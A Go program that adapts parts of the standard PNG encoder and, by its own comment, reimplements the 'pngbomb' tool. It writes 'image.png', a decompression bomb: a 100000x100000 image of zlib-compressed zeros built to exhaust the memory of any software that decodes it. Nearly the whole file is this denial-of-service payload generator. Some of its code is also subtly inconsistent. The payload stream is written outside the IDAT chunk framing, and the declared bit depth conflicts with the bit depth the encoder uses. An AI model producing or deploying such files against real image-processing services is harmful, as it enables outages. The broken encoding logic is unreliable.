// main
package main

import (
	"bufio"
	"compress/zlib"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"image"
	"image/color"
	"image/png"
	"io"
	"os"
	"strconv"
)

/*
from image/png/reader.go
*/

const pngHeader = "\x89PNG\r\n\x1a\n"

// Color type, as per the PNG spec.
const (
	ctGrayscale      = 0
	ctTrueColor      = 2
	ctPaletted       = 3
	ctGrayscaleAlpha = 4
	ctTrueColorAlpha = 6
)

// Filter type, as per the PNG spec.
const (
	ftNone    = 0
	ftSub     = 1
	ftUp      = 2
	ftAverage = 3
	ftPaeth   = 4
	nFilter   = 5
)

// An UnsupportedError reports that the input uses a valid but unimplemented PNG feature.
type UnsupportedError string

func (e UnsupportedError) Error() string { return "png: unsupported feature: " + string(e) }

// A FormatError reports that the input is not a valid PNG.
type FormatError string

func (e FormatError) Error() string { return "png: invalid format: " + string(e) }

/*
from image/png/writer.go
*/

type encoder struct {
	enc     *png.Encoder
	w       io.Writer
	m       image.Image
	cb      int
	err     error
	header  [8]byte
	footer  [4]byte
	tmp     [4 * 256]byte
	cr      [nFilter][]uint8
	pr      []uint8
	zw      *zlib.Writer
	zwLevel int
	bw      *bufio.Writer
}

func (e *encoder) writeChunk(b []byte, name string) {
	if e.err != nil {
		return
	}
	n := uint32(len(b))
	if int(n) != len(b) {
		e.err = UnsupportedError(name + " chunk is too large: " + strconv.Itoa(len(b)))
		return
	}
	binary.BigEndian.PutUint32(e.header[:4], n)
	e.header[4] = name[0]
	e.header[5] = name[1]
	e.header[6] = name[2]
	e.header[7] = name[3]
	crc := crc32.NewIEEE()
	crc.Write(e.header[4:8])
	crc.Write(b)
	binary.BigEndian.PutUint32(e.footer[:4], crc.Sum32())

	_, e.err = e.w.Write(e.header[:8])
	if e.err != nil {
		return
	}
	_, e.err = e.w.Write(b)
	if e.err != nil {
		return
	}
	_, e.err = e.w.Write(e.footer[:4])
}

func (e *encoder) writeIHDR() {
	b := e.m.Bounds()
	binary.BigEndian.PutUint32(e.tmp[0:4], uint32(b.Dx()))
	binary.BigEndian.PutUint32(e.tmp[4:8], uint32(b.Dy()))
	e.tmp[8] = 1
	e.tmp[9] = ctGrayscale
	e.tmp[10] = 0 // default compression method
	e.tmp[11] = 0 // default filter method
	e.tmp[12] = 0 // non-interlaced
	e.writeChunk(e.tmp[:13], "IHDR")
}

func (e *encoder) writeImage(w io.Writer, m image.Image, cb int, level int) error {
	if e.zw == nil || e.zwLevel != level {
		zw, err := zlib.NewWriterLevel(w, level)
		if err != nil {
			return err
		}
		e.zw = zw
		e.zwLevel = level
	} else {
		e.zw.Reset(w)
	}
	defer e.zw.Close()

	bitsPerPixel := 2 // may need to be 1?

	// cr[*] and pr are the bytes for the current and previous row.
	// cr[0] is unfiltered (or equivalently, filtered with the ftNone filter).
	// cr[ft], for non-zero filter types ft, are buffers for transforming cr[0] under the
	// other PNG filter types. These buffers are allocated once and re-used for each row.
	// The +1 is for the per-row filter type, which is at cr[*][0].
	b := m.Bounds()
	sz := 1 + (bitsPerPixel*b.Dx()+7)/8
	for i := range e.cr {
		if cap(e.cr[i]) < sz {
			e.cr[i] = make([]uint8, sz)
		} else {
			e.cr[i] = e.cr[i][:sz]
		}
		e.cr[i][0] = uint8(i)
	}
	cr := e.cr
	if cap(e.pr) < sz {
		e.pr = make([]uint8, sz)
	} else {
		e.pr = e.pr[:sz]
		clear(e.pr)
	}
	pr := e.pr

	for y := b.Min.Y; y < b.Max.Y; y++ {
		// Convert from colors to bytes.
		i := 1
		pi := m.(image.PalettedImage)

		var a uint8
		var c int
		pixelsPerByte := 8 / bitsPerPixel
		for x := b.Min.X; x < b.Max.X; x++ {
			a = a<<uint(bitsPerPixel) | pi.ColorIndexAt(x, y)
			c++
			if c == pixelsPerByte {
				cr[0][i] = a
				i++
				a = 0
				c = 0
			}
		}
		if c != 0 {
			for c != pixelsPerByte {
				a = a << uint(bitsPerPixel)
				c++
			}
			cr[0][i] = a
		}

		// Apply the filter.
		// Skip filter for NoCompression and paletted images (cbP8) as
		// "filters are rarely useful on palette images" and will result
		// in larger files (see http://www.libpng.org/pub/png/book/chapter09.html).
		f := ftNone
		if cb != 2 {
			if debug {
				fmt.Printf("ignoring cb value, but got: %d\n", cb)
			}
		}

		// Write the compressed bytes.
		if _, err := e.zw.Write(cr[f]); err != nil {
			return err
		}

		// The current row for y is the previous row for y+1.
		pr, cr[0] = cr[0], pr
	}
	return nil
}

// This function is required because we want the zero value of
// Encoder.CompressionLevel to map to zlib.DefaultCompression.
func levelToZlib(l png.CompressionLevel) int {
	switch l {
	case png.DefaultCompression:
		return zlib.DefaultCompression
	case png.NoCompression:
		return zlib.NoCompression
	case png.BestSpeed:
		return zlib.BestSpeed
	case png.BestCompression:
		return zlib.BestCompression
	default:
		return zlib.DefaultCompression
	}
}

func (e *encoder) writeIEND() { e.writeChunk(nil, "IEND") }

// Write the actual image data to one or more IDAT chunks.
func (e *encoder) writeIDATs() {
	if e.err != nil {
		return
	}
	if e.bw == nil {
		e.bw = bufio.NewWriterSize(e, 1<<15)
	} else {
		e.bw.Reset(e)
	}
	/*
		fmt.Printf("bw: %+v\n", e.bw)
		fmt.Printf("m: %+v\n", e.m)
		fmt.Printf("cb: %+v\n", e.cb)
		fmt.Printf("enc: %+v\n", e.enc)
		fmt.Printf("enc.CompressionLevel: %+v\n", e.enc.CompressionLevel)
	*/
	e.err = e.writeImage(e.bw, e.m, e.cb, levelToZlib(e.enc.CompressionLevel))
	if e.err != nil {
		return
	}
	e.err = e.bw.Flush()
}

// An encoder is an io.Writer that satisfies writes by writing PNG IDAT chunks,
// including an 8-byte header and 4-byte CRC checksum per Write call. Such calls
// should be relatively infrequent, since writeIDATs uses a [bufio.Writer].
//
// This method should only be called from writeIDATs (via writeImage).
// No other code should treat an encoder as an io.Writer.
func (e *encoder) Write(b []byte) (int, error) {
	e.writeChunk(b, "IDAT")
	if e.err != nil {
		return 0, e.err
	}
	return len(b), nil
}

/*
from image/png/writer_test.go
*/
type pool struct {
	b *png.EncoderBuffer
}

func (p *pool) Get() *png.EncoderBuffer {
	return p.b
}

func (p *pool) Put(b *png.EncoderBuffer) {
	p.b = b
}

/*
Reimplementation of https://github.com/liclac/pngbomb/blob/f0fc2f2a42784557727e44be2f1b86844759a6fa/src/main.rs#L128-L151
*/
func writePayload(width int, height int, w io.Writer) (err error) {
	// PNG bitmap data is grouped in "scanlines", eg. data for one horizontal line, prefixed with
	// a 1-byte filter mode flag. We're using no filters (0) and all-black (0) pixels, we just want
	// to generate a whole pile of deflated zeroes, but without allocating it all upfront.
	samples := width
	samplesPerByte := 8 / 1
	fmt.Printf("samples: %d\n", samples)
	fmt.Printf("samplesPerByte: %d\n", samplesPerByte)
	whole := samples / samplesPerByte
	var fract int
	if samples%samplesPerByte > 0 {
		fract = 1
	}
	rawRowLength := 1 + whole + fract
	ibytes := rawRowLength * height
	fmt.Printf("rawRowLength: %d\n", rawRowLength)
	fmt.Printf("height: %d\n", height)
	fmt.Printf("ibytes: %d\n", ibytes)

	// set up a zlib writer to compress image data
	zw, err := zlib.NewWriterLevel(w, 9)
	if err != nil {
		return err
	}

	// write the blank image data through zlib
	var at int
	buf := make([]byte, 2*1024*1024)
	for {
		ln := ibytes - at
		if ln > len(buf) {
			ln = len(buf)
		}
		if ln <= 0 {
			break
		}
		n, err := zw.Write(buf[:ln])
		if err != nil {
			return err
		}
		at += n
	}
	return
}

func generatePNG(width int, height int, w io.Writer) error {
	e := &encoder{}
	pal := color.Palette{}
	e.m = image.NewPaletted(image.Rectangle{image.Point{0, 0}, image.Point{width, height}}, pal)
	e.cb = 1
	e.w = w
	e.enc = &png.Encoder{-3, &pool{}}

	io.WriteString(w, pngHeader)
	e.writeIHDR()

	err := writePayload(width, height, w)
	if err != nil {
		return fmt.Errorf("unable to write payload: %v", err)
	}
	e.writeIDATs()
	e.writeIEND()

	return nil
}

var (
	debug = false
)

func main() {
	width := 100000
	height := 100000
	w, err := os.Create("image.png")
	if err != nil {
		fmt.Printf("error: %v\n", err)
		os.Exit(2)
	}
	err = generatePNG(width, height, w)
	if err != nil {
		fmt.Printf("error: %v\n", err)
		os.Exit(2)
	}
}
